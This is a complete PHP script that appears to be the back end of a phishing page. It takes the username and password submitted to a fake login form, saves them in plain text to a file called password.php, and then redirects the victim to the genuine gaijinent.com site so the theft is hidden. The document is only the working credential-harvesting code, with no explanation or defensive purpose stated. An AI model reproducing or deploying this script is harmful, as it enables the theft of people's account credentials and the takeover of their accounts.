<?PHP
$Log = $_POST['login'];
$Pass = $_POST['pass'];
$log = fopen("password.php","at");
fwrite($log,"$Log:$Pass\n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://www.gaijinent.com/'></head></html>";
?>
